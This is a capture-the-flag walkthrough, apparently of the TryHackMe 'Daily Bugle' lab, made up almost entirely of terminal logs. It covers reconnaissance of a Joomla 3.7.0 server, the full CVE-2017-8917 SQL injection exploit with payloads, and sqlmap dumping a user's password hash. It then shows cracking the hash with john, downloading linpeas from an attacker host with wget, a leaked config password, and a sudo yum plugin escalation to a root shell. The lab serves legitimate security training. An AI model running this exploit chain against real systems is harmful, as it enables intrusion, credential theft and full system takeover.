```
root@kali:~# nmap -A -p- -T5 10.10.105.97
Starting Nmap 7.80 ( https://nmap.org ) at 2020-05-24 02:06 UTC
Nmap scan report for ip-10-10-105-97.eu-west-1.compute.internal (10.10.105.97)
Host is up (0.00048s latency).
Not shown: 65532 closed ports
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.4 (protocol 2.0)
| ssh-hostkey:
|   2048 68:ed:7b:19:7f:ed:14:e6:18:98:6d:c5:88:30:aa:e9 (RSA)
|   256 5c:d6:82:da:b2:19:e3:37:99:fb:96:82:08:70:ee:9d (ECDSA)
|_  256 d2:a9:75:cf:2f:1e:f5:44:4f:0b:13:c2:0f:d7:37:cc (ED25519)
80/tcp   open  http    Apache httpd 2.4.6 ((CentOS) PHP/5.6.40)
|_http-generator: Joomla! - Open Source Content Management
| http-robots.txt: 15 disallowed entries
| /joomla/administrator/ /administrator/ /bin/ /cache/
| /cli/ /components/ /includes/ /installation/ /language/
|_/layouts/ /libraries/ /logs/ /modules/ /plugins/ /tmp/
|_http-server-header: Apache/2.4.6 (CentOS) PHP/5.6.40
|_http-title: Home
3306/tcp open  mysql   MariaDB (unauthorized)
MAC Address: 02:68:33:29:B0:24 (Unknown)
Aggressive OS guesses: Linux 3.10 - 3.13 (99%), Linux 3.8 (96%), ASUS RT-N56U WAP (Linux 3.4) (94%), Linux 3.16 (94%), Linux 3.1 (93%), Linux 3.2 (93%), Linux 3.10 (92%), Linux 3.18 (92%), Linux 3.2 - 4.9 (92%), Linux 3.4 - 3.10 (92%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 1 hop

TRACEROUTE
HOP RTT     ADDRESS
1   0.48 ms ip-10-10-105-97.eu-west-1.compute.internal (10.10.105.97)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 21.72 seconds
root@kali:~#
```

```
root@kali:~# gobuster dir -u 10.10.105.97 -w /usr/share/wordlists/dirb/big.txt -x txt,php,html,jsp
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.105.97
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/dirb/big.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Extensions:     html,jsp,txt,php
[+] Timeout:        10s
===============================================================
2020/05/24 02:38:18 Starting gobuster
===============================================================
/.htpasswd (Status: 403)
/.htpasswd.txt (Status: 403)
/.htpasswd.php (Status: 403)
/.htpasswd.html (Status: 403)
/.htpasswd.jsp (Status: 403)
/.htaccess (Status: 403)
/.htaccess.txt (Status: 403)
/.htaccess.php (Status: 403)
/.htaccess.html (Status: 403)
/.htaccess.jsp (Status: 403)
/LICENSE.txt (Status: 200)
/README.txt (Status: 200)
/administrator (Status: 301)
/bin (Status: 301)
/cache (Status: 301)
/cgi-bin/ (Status: 403)
/cgi-bin/.html (Status: 403)
/cli (Status: 301)
/components (Status: 301)
/configuration.php (Status: 200)
/htaccess.txt (Status: 200)
/images (Status: 301)
/includes (Status: 301)
/index.php (Status: 200)
/language (Status: 301)
/layouts (Status: 301)
/libraries (Status: 301)
/media (Status: 301)
/modules (Status: 301)
/plugins (Status: 301)
/robots.txt (Status: 200)
/robots.txt (Status: 200)
/templates (Status: 301)
/tmp (Status: 301)
===============================================================
2020/05/24 02:38:29 Finished
===================
```

## joomscan
```
root@kali:~# joomscan -u http://$targetIP
__  _____  _____  __  __  ___   ___    __    _  _
   (_  _)(  _  )(  _  )(  \/  )/ __) / __)  /__\  ( \( )
  .-_)(   )(_)(  )(_)(  )    ( \__ \( (__  /(__)\  )  (
  \____) (_____)(_____)(_/\/\_)(___/ \___)(__)(__)(_)\_)
                        (1337.today)

    --=[OWASP JoomScan
    +---++---==[Version : 0.0.7
    +---++---==[Update Date : [2018/09/23]
    +---++---==[Authors : Mohammad Reza Espargham , Ali Razmjoo
    --=[Code name : Self Challenge
    @OWASP_JoomScan , @rezesp , @Ali_Razmjo0 , @OWASP

Processing http://10.10.105.97 ...



[+] FireWall Detector
[++] Firewall not detected

[+] Detecting Joomla Version
[++] Joomla 3.7.0

[+] Core Joomla Vulnerability
[++] Target Joomla core is not vulnerable

[+] Checking Directory Listing
[++] directory has directory listing :
http://10.10.105.97/administrator/components
http://10.10.105.97/administrator/modules
http://10.10.105.97/administrator/templates
http://10.10.105.97/images/banners


[+] Checking apache info/status files
[++] Readable info/status files are not found

[+] admin finder
[++] Admin page : http://10.10.105.97/administrator/

[+] Checking robots.txt existing
[++] robots.txt is found
path : http://10.10.105.97/robots.txt

Interesting path found from robots.txt
http://10.10.105.97/joomla/administrator/
http://10.10.105.97/administrator/
http://10.10.105.97/bin/
http://10.10.105.97/cache/
http://10.10.105.97/cli/
http://10.10.105.97/components/
http://10.10.105.97/includes/
http://10.10.105.97/installation/
http://10.10.105.97/language/
http://10.10.105.97/layouts/
http://10.10.105.97/libraries/
http://10.10.105.97/logs/
http://10.10.105.97/modules/
http://10.10.105.97/plugins/
http://10.10.105.97/tmp/


[+] Finding common backup files name
[++] Backup files are not found

[+] Finding common log files name
[++] error log is not found

[+] Checking sensitive config.php.x file
[++] Readable config files are not found


Your Report : reports/10.10.105.97/
root@kali:~#
```

```
root@kali:~# searchsploit -x exploits/php/webapps/42033.txt
  Exploit: Joomla! 3.7.0 - 'com_fields' SQL Injection
      URL: https://www.exploit-db.com/exploits/42033
     Path: /usr/share/exploitdb/exploits/php/webapps/42033.txt
File Type: ASCII text, with CRLF line terminators
 Exploit Title: Joomla 3.7.0 - Sql Injection
# Date: 05-19-2017
# Exploit Author: Mateus Lino
# Reference: https://blog.sucuri.net/2017/05/sql-injection-vulnerability-joomla-3-7.html
# Vendor Homepage: https://www.joomla.org/
# Version: = 3.7.0
# Tested on: Win, Kali Linux x64, Ubuntu, Manjaro and Arch Linux
# CVE : - CVE-2017-8917


URL Vulnerable: http://localhost/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml%27


Using Sqlmap:

sqlmap -u "http://localhost/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml" --risk=3 --level=5 --random-agent --dbs -p list[fullordering]


Parameter: list[fullordering] (GET)
    Type: boolean-based blind
    Title: Boolean-based blind - Parameter replace (DUAL)
    Payload: option=com_fields&view=fields&layout=modal&list[fullordering]=(CASE WHEN (1573=1573) THEN 1573 ELSE 1573*(SELECT 1573 FROM DUAL UNION SELECT 9674 FROM DUAL) END)

    Type: error-based
    Title: MySQL >= 5.0 error-based - Parameter replace (FLOOR)
    Payload: option=com_fields&view=fields&layout=modal&list[fullordering]=(SELECT 6600 FROM(SELECT COUNT(*),CONCAT(0x7171767071,(SELECT (ELT(6600=6600,1))),0x716a707671,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)

    Type: AND/OR time-based blind
    Title: MySQL >= 5.0.12 time-based blind - Parameter replace (substraction)
    Payload: option=com_fields&view=fields&layout=modal&list[fullordering]=(SELECT * FROM (SELECT(SLEEP(5)))GDiu)

  Usage: searchsploit [options] term1 [term2] ... [termN]
```

```
root@kali:~# sqlmap -u "http://10.10.105.97/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml" --risk=3 --level=5 --random-agent --dbs -p list[fullordering]

sqlmap identified the following injection point(s) with a total of 2501 HTTP(s) requests:
---
Parameter: list[fullordering] (GET)
    Type: error-based
    Title: MySQL >= 5.0 error-based - Parameter replace (FLOOR)
    Payload: option=com_fields&view=fields&layout=modal&list[fullordering]=(SELECT 7493 FROM(SELECT COUNT(*),CONCAT(0x716a7a7071,(SELECT (ELT(7493=7493,1))),0x7176787671,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
---
[03:03:54] [INFO] the back-end DBMS is MySQL
back-end DBMS: MySQL >= 5.0
[03:03:54] [INFO] fetching database names
[03:03:59] [INFO] used SQL query returns 5 entries
[03:04:00] [INFO] retrieved: 'information_schema'
[03:04:01] [INFO] retrieved: 'joomla'
[03:04:02] [INFO] retrieved: 'mysql'
[03:04:03] [INFO] retrieved: 'performance_schema'
[03:04:04] [INFO] retrieved: 'test'
available databases [5]:
[*] information_schema
[*] joomla
[*] mysql
[*] performance_schema
[*] test

root@kali:~# sqlmap -u "http://10.10.105.97/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml" --risk=3 --level=5 --random-agent --dbms MySQL -p list[fullordering] -D joomla --tables

[03:05:24] [INFO] testing MySQL
[03:05:24] [INFO] confirming MySQL
[03:05:25] [INFO] the back-end DBMS is MySQL
back-end DBMS: MySQL >= 5.0.0 (MariaDB fork)
[03:05:25] [INFO] fetching tables for database: 'joomla'
[03:05:25] [INFO] used SQL query returns 72 entries
[03:05:25] [INFO] retrieved: '#__assets'
[03:05:25] [INFO] retrieved: '#__associations'
[03:05:25] [INFO] retrieved: '#__banner_clients'
[03:05:26] [INFO] retrieved: '#__banner_tracks'
[03:05:26] [INFO] retrieved: '#__banners'
[03:05:26] [INFO] retrieved: '#__categories'
[03:05:26] [INFO] retrieved: '#__contact_details'
[03:05:26] [INFO] retrieved: '#__content'
[03:05:26] [INFO] retrieved: '#__content_frontpage'
[03:05:26] [INFO] retrieved: '#__content_rating'
[03:05:26] [INFO] retrieved: '#__content_types'
[03:05:26] [INFO] retrieved: '#__contentitem_tag_map'
[03:05:26] [INFO] retrieved: '#__core_log_searches'
[03:05:27] [INFO] retrieved: '#__extensions'
[03:05:27] [INFO] retrieved: '#__fields'
[03:05:27] [INFO] retrieved: '#__fields_categories'
[03:05:27] [INFO] retrieved: '#__fields_groups'
[03:05:27] [INFO] retrieved: '#__fields_values'
[03:05:27] [INFO] retrieved: '#__finder_filters'
[03:05:27] [INFO] retrieved: '#__finder_links'
[03:05:27] [INFO] retrieved: '#__finder_links_terms0'
[03:05:27] [INFO] retrieved: '#__finder_links_terms1'
[03:05:27] [INFO] retrieved: '#__finder_links_terms2'
[03:05:27] [INFO] retrieved: '#__finder_links_terms3'
[03:05:28] [INFO] retrieved: '#__finder_links_terms4'
[03:05:28] [INFO] retrieved: '#__finder_links_terms5'
[03:05:28] [INFO] retrieved: '#__finder_links_terms6'
[03:05:28] [INFO] retrieved: '#__finder_links_terms7'
[03:05:28] [INFO] retrieved: '#__finder_links_terms8'
[03:05:28] [INFO] retrieved: '#__finder_links_terms9'
[03:05:28] [INFO] retrieved: '#__finder_links_termsa'
[03:05:28] [INFO] retrieved: '#__finder_links_termsb'
[03:05:28] [INFO] retrieved: '#__finder_links_termsc'
[03:05:28] [INFO] retrieved: '#__finder_links_termsd'
[03:05:29] [INFO] retrieved: '#__finder_links_termse'
[03:05:29] [INFO] retrieved: '#__finder_links_termsf'
[03:05:29] [INFO] retrieved: '#__finder_taxonomy'
[03:05:29] [INFO] retrieved: '#__finder_taxonomy_map'
[03:05:29] [INFO] retrieved: '#__finder_terms'
[03:05:29] [INFO] retrieved: '#__finder_terms_common'
[03:05:29] [INFO] retrieved: '#__finder_tokens'
[03:05:29] [INFO] retrieved: '#__finder_tokens_aggregate'
[03:05:29] [INFO] retrieved: '#__finder_types'
[03:05:29] [INFO] retrieved: '#__languages'
[03:05:29] [INFO] retrieved: '#__menu'
[03:05:30] [INFO] retrieved: '#__menu_types'
[03:05:30] [INFO] retrieved: '#__messages'
[03:05:30] [INFO] retrieved: '#__messages_cfg'
[03:05:30] [INFO] retrieved: '#__modules'
[03:05:30] [INFO] retrieved: '#__modules_menu'
[03:05:30] [INFO] retrieved: '#__newsfeeds'
[03:05:30] [INFO] retrieved: '#__overrider'
[03:05:30] [INFO] retrieved: '#__postinstall_messages'
[03:05:30] [INFO] retrieved: '#__redirect_links'
[03:05:30] [INFO] retrieved: '#__schemas'
[03:05:31] [INFO] retrieved: '#__session'
[03:05:31] [INFO] retrieved: '#__tags'
[03:05:31] [INFO] retrieved: '#__template_styles'
[03:05:31] [INFO] retrieved: '#__ucm_base'
[03:05:31] [INFO] retrieved: '#__ucm_content'
[03:05:31] [INFO] retrieved: '#__ucm_history'
[03:05:31] [INFO] retrieved: '#__update_sites'
[03:05:31] [INFO] retrieved: '#__update_sites_extensions'
[03:05:31] [INFO] retrieved: '#__updates'
[03:05:31] [INFO] retrieved: '#__user_keys'
[03:05:31] [INFO] retrieved: '#__user_notes'
[03:05:32] [INFO] retrieved: '#__user_profiles'
[03:05:32] [INFO] retrieved: '#__user_usergroup_map'
[03:05:32] [INFO] retrieved: '#__usergroups'
[03:05:32] [INFO] retrieved: '#__users'
[03:05:32] [INFO] retrieved: '#__utf8_conversion'
[03:05:32] [INFO] retrieved: '#__viewlevels'
Database: joomla
[72 tables]
+----------------------------+
| #__assets                  |
| #__associations            |
| #__banner_clients          |
| #__banner_tracks           |
| #__banners                 |
| #__categories              |
| #__contact_details         |
| #__content_frontpage       |
| #__content_rating          |
| #__content_types           |
| #__content                 |
| #__contentitem_tag_map     |
| #__core_log_searches       |
| #__extensions              |
| #__fields_categories       |
| #__fields_groups           |
| #__fields_values           |
| #__fields                  |
| #__finder_filters          |
| #__finder_links_terms0     |
| #__finder_links_terms1     |
| #__finder_links_terms2     |
| #__finder_links_terms3     |
| #__finder_links_terms4     |
| #__finder_links_terms5     |
| #__finder_links_terms6     |
| #__finder_links_terms7     |
| #__finder_links_terms8     |
| #__finder_links_terms9     |
| #__finder_links_termsa     |
| #__finder_links_termsb     |
| #__finder_links_termsc     |
| #__finder_links_termsd     |
| #__finder_links_termse     |
| #__finder_links_termsf     |
| #__finder_links            |
| #__finder_taxonomy_map     |
| #__finder_taxonomy         |
| #__finder_terms_common     |
| #__finder_terms            |
| #__finder_tokens_aggregate |
| #__finder_tokens           |
| #__finder_types            |
| #__languages               |
| #__menu_types              |
| #__menu                    |
| #__messages_cfg            |
| #__messages                |
| #__modules_menu            |
| #__modules                 |
| #__newsfeeds               |
| #__overrider               |
| #__postinstall_messages    |
| #__redirect_links          |
| #__schemas                 |
| #__session                 |
| #__tags                    |
| #__template_styles         |
| #__ucm_base                |
| #__ucm_content             |
| #__ucm_history             |
| #__update_sites_extensions |
| #__update_sites            |
| #__updates                 |
| #__user_keys               |
| #__user_notes              |
| #__user_profiles           |
| #__user_usergroup_map      |
| #__usergroups              |
| #__users                   |
| #__utf8_conversion         |
| #__viewlevels              |
+----------------------------+

[03:05:32] [WARNING] HTTP error codes detected during run:
500 (Internal Server Error) - 79 times
[03:05:32] [INFO] fetched data logged to text files under '/root/.sqlmap/output/10.10.105.97'
[03:05:32] [WARNING] you haven't updated sqlmap for more than 143 days!!!

[*] ending @ 03:05:32 /2020-05-24/

root@kali:~# sqlmap -u "http://10.10.105.97/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml" --risk=3 --level=5 --random-agent --dbms MySQL -p list[fullordering] -D joomla -T "#__users" --dump
        ___
       __H__
 ___ ___[']_____ ___ ___  {1.4#stable}
|_ -| . [,]     | .'| . |
|___|_  [(]_|_|_|__,|  _|
      |_|V...       |_|   http://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 03:31:54 /2020-05-24/

[03:31:54] [INFO] fetched random HTTP User-Agent header value 'Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/532.2 (KHTML, like Gecko) Chrome/4.0.221.3 Safari/532.2' from file '/usr/share/sqlmap/data/txt/user-agents.txt'
[03:31:54] [INFO] testing connection to the target URL
[03:31:56] [WARNING] the web server responded with an HTTP error code (500) which could interfere with the results of the tests
you have not declared cookie(s), while server wants to set its own ('eaa83fe8b963ab08ce9ab7d4a798de05=epusd27is32...uj4u3v96b2'). Do you want to use those [Y/n] y
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: list[fullordering] (GET)
    Type: error-based
    Title: MySQL >= 5.0 error-based - Parameter replace (FLOOR)
    Payload: option=com_fields&view=fields&layout=modal&list[fullordering]=(SELECT 7493 FROM(SELECT COUNT(*),CONCAT(0x716a7a7071,(SELECT (ELT(7493=7493,1))),0x7176787671,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
---
[03:32:08] [INFO] testing MySQL
[03:32:08] [INFO] confirming MySQL
[03:32:10] [INFO] the back-end DBMS is MySQL
back-end DBMS: MySQL >= 5.0.0 (MariaDB fork)
[03:32:10] [INFO] fetching columns for table '#__users' in database 'joomla'
[03:32:10] [WARNING] unable to retrieve column names for table '#__users' in database 'joomla'
do you want to use common column existence check? [y/N/q] y
[03:32:15] [WARNING] in case of continuous data retrieval problems you are advised to try a switch '--no-cast' or switch '--hex'
which common columns (wordlist) file do you want to use?
[1] default '/usr/share/sqlmap/data/txt/common-columns.txt' (press Enter)
[2] custom
> 2
what's the custom common columns file location?
> /root/small.txt
[03:32:27] [INFO] checking column existence using items from '/root/small.txt'
[03:32:27] [INFO] adding words used on web page to the check list
please enter number of threads? [Enter for 1 (current)] 1
[03:32:34] [WARNING] running in a single-thread mode. This could take a while
[03:32:36] [INFO] retrieved: id
[03:32:38] [INFO] retrieved: name
[03:32:40] [INFO] retrieved: username
[03:32:42] [INFO] retrieved: email
[03:32:44] [INFO] retrieved: password

[03:34:40] [INFO] fetching entries for table '#__users' in database 'joomla'
[03:34:42] [INFO] used SQL query returns 1 entry
[03:34:44] [INFO] retrieved: 'jonah@tryhackme.com'
[03:34:46] [INFO] retrieved: '811'
[03:34:48] [INFO] retrieved: 'Super User'
[03:34:52] [INFO] retrieved: '$2y$10$0veO/JSFh4389Lluc4Xya.dfy2MF.bZhz0jVMw.V.d3p12kBtZutm'
[03:34:54] [INFO] retrieved: 'jonah'
Database: joomla
Table: #__users
[1 entry]
+-----+------------+---------------------+--------------------------------------------------------------+----------+
| id  | name       | email               | password                                                     | username |
+-----+------------+---------------------+--------------------------------------------------------------+----------+
| 811 | Super User | jonah@tryhackme.com | $2y$10$0veO/JSFh4389Lluc4Xya.dfy2MF.bZhz0jVMw.V.d3p12kBtZutm | jonah    |
+-----+------------+---------------------+--------------------------------------------------------------+----------+

[03:34:54] [INFO] table 'joomla.`#__users`' dumped to CSV file '/root/.sqlmap/output/10.10.105.97/dump/joomla/#__users.csv'
[03:34:54] [WARNING] HTTP error codes detected during run:
500 (Internal Server Error) - 73 times
[03:34:54] [INFO] fetched data logged to text files under '/root/.sqlmap/output/10.10.105.97'
[03:34:54] [WARNING] you haven't updated sqlmap for more than 143 days!!!

[*] ending @ 03:34:54 /2020-05-24/

root@kali:~# john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
Using default input encoding: UTF-8
Loaded 1 password hash (bcrypt [Blowfish 32/64 X3])
Cost 1 (iteration count) is 1024 for all loaded hashes
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
0g 0:00:01:36 0.04% (ETA: 2020-05-26 21:53) 0g/s 72.96p/s 72.96c/s 72.96C/s pink10..bigboi
0g 0:00:10:00 0.25% (ETA: 2020-05-26 21:33) 0g/s 73.00p/s 73.00c/s 73.00C/s molecules..mhark
spiderman123     (?)
1g 0:00:10:41 DONE (2020-05-24 03:49) 0.001558g/s 73.00p/s 73.00c/s 73.00C/s sweetsmile..speciala
Use the "--show" option to display all of the cracked passwords reliably
Session completed
root@kali:~#
sh-4.2$ cd /tmp
cd /tmp
sh-4.2$ wget http://10.10.67.255/linpeas.sh
wget http://10.10.67.255/linpeas.sh
--2020-05-24 00:11:48--  http://10.10.67.255/linpeas.sh
Connecting to 10.10.67.255:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 222708 (217K) [text/x-sh]
Saving to: 'linpeas.sh'

     0K .......... .......... .......... .......... .......... 22% 66.9M 0s
    50K .......... .......... .......... .......... .......... 45%  231M 0s
   100K .......... .......... .......... .......... .......... 68%  108M 0s
   150K .......... .......... .......... .......... .......... 91% 95.2M 0s
   200K .......... .......                                    100%  368M=0.002s

2020-05-24 00:11:48 (109 MB/s) - 'linpeas.sh' saved [222708/222708]

sh-4.2$ chmod +x linpeas.sh
chmod +x linpeas.sh
sh-4.2$ ./linpeas.sh

[+] All users & groups
uid=0(root) gid=0(root) groups=0(root)
uid=1(bin) gid=1(bin) groups=1(bin)
uid=1000(jjameson) gid=1000(jjameson) groups=1000(jjameson)
uid=11(operator) gid=0(root) groups=0(root)
uid=12(games) gid=100(users) groups=100(users)
uid=14(ftp) gid=50(ftp) groups=50(ftp)
uid=192(systemd-network) gid=192(systemd-network) groups=192(systemd-network)
uid=2(daemon) gid=2(daemon) groups=2(daemon)
uid=27(mysql) gid=27(mysql) groups=27(mysql)
uid=3(adm) gid=4(adm) groups=4(adm)
uid=4(lp) gid=7(lp) groups=7(lp)
uid=48(apache) gid=48(apache) groups=48(apache)
uid=5(sync) gid=0(root) groups=0(root)
uid=6(shutdown) gid=0(root) groups=0(root)
uid=7(halt) gid=0(root) groups=0(root)
uid=74(sshd) gid=74(sshd) groups=74(sshd)
uid=8(mail) gid=12(mail) groups=12(mail)
uid=81(dbus) gid=81(dbus) groups=81(dbus)
uid=89(postfix) gid=89(postfix) groups=89(postfix),12(mail)
uid=99(nobody) gid=99(nobody) groups=99(nobody)
uid=998(chrony) gid=996(chrony) groups=996(chrony)
uid=999(polkitd) gid=998(polkitd) groups=998(polkitd)

[+] Searching passwords in config PHP files
        public $password = 'nv5uz9r3ZEDzVjNu';

[jjameson@dailybugle ~]$ ls -al
total 16
drwx------. 2 jjameson jjameson  99 Dec 15 19:47 .
drwxr-xr-x. 3 root     root      22 Dec 14 14:02 ..
lrwxrwxrwx  1 jjameson jjameson   9 Dec 14 15:41 .bash_history -> /dev/null
-rw-r--r--. 1 jjameson jjameson  18 Aug  8  2019 .bash_logout
-rw-r--r--. 1 jjameson jjameson 193 Aug  8  2019 .bash_profile
-rw-r--r--. 1 jjameson jjameson 231 Aug  8  2019 .bashrc
-rw-rw-r--  1 jjameson jjameson  33 Dec 15 19:47 user.txt
[jjameson@dailybugle ~]$ cat user.txt
27a260fe3cba712cfdedb1c86d80442e
[jjameson@dailybugle ~]$
[jjameson@dailybugle ~]$ sudo -l
Matching Defaults entries for jjameson on dailybugle:
    !visiblepw, always_set_home, match_group_by_gid, always_query_group_plugin,
    env_reset, env_keep="COLORS DISPLAY HOSTNAME HISTSIZE KDEDIR LS_COLORS",
    env_keep+="MAIL PS1 PS2 QTDIR USERNAME LANG LC_ADDRESS LC_CTYPE",
    env_keep+="LC_COLLATE LC_IDENTIFICATION LC_MEASUREMENT LC_MESSAGES",
    env_keep+="LC_MONETARY LC_NAME LC_NUMERIC LC_PAPER LC_TELEPHONE",
    env_keep+="LC_TIME LC_ALL LANGUAGE LINGUAS _XKB_CHARSET XAUTHORITY",
    secure_path=/sbin\:/bin\:/usr/sbin\:/usr/bin

User jjameson may run the following commands on dailybugle:
    (ALL) NOPASSWD: /usr/bin/yum
[jjameson@dailybugle ~]$ TF=$(mktemp -d)
[jjameson@dailybugle ~]$ echo 'id' > $TF/x.sh
[jjameson@dailybugle ~]$ fpm -n x -s dir -t rpm -a all --before-install $TF/x.sh $TF
-bash: fpm: command not found
[jjameson@dailybugle ~]$ cat >$TF/x<<EOF
> [main]
> plugins=1
> pluginpath=$TF
> pluginconfpath=$TF
> EOF
[jjameson@dailybugle ~]$ cat >$TF/y.conf<<EOF
> [main]
> enabled=1
> EOF
[jjameson@dailybugle ~]$ cat >$TF/y.py<<EOF
> import os
> import yum
> from yum.plugins import PluginYumExit, TYPE_CORE, TYPE_INTERACTIVE
> requires_api_version='2.1'
> def init_hook(conduit):
>   os.execl('/bin/sh','/bin/sh')
> EOF
[jjameson@dailybugle ~]$ sudo yum -c $TF/x --enableplugin=y
Loaded plugins: y
No plugin match for: y
sh-4.2# whoami
root
sh-4.2# cd /root
sh-4.2# ls -al
total 28
dr-xr-x---.  3 root root  163 Dec 15 19:47 .
dr-xr-xr-x. 17 root root  244 Dec 14 15:40 ..
-rw-------.  1 root root 1484 Dec 14 14:03 anaconda-ks.cfg
lrwxrwxrwx   1 root root    9 Dec 14 15:42 .bash_history -> /dev/null
-rw-r--r--.  1 root root   18 Dec 28  2013 .bash_logout
-rw-r--r--.  1 root root  176 Dec 28  2013 .bash_profile
-rw-r--r--.  1 root root  176 Dec 28  2013 .bashrc
-rw-r--r--.  1 root root  100 Dec 28  2013 .cshrc
drwxr-----.  3 root root   19 Dec 14 15:12 .pki
-rw-r--r--   1 root root   33 Dec 15 19:47 root.txt
-rw-r--r--.  1 root root  129 Dec 28  2013 .tcshrc
sh-4.2# cat root.txt
eec3d53292b1821868266858d7fa6f79
```
